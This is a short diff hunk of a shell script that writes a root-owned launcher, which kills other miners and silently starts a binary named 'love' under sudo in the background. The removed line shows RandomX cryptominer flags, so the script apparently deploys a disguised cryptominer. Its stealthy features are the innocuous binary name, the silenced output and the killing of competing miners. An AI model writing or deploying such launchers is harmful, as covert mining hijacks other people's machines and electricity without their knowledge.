@@ -29,7 +29,7 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 ./kill_miner.sh
 sleep 3
-sudo /root/love --threads=$cores --background -a rx/0 -k > /dev/null 2>&1 &
+sudo /root/love --threads=$cores --background > /dev/null 2>&1 &
 sleep 3
 EOF
 chmod +x /root/danielluis1921.sh
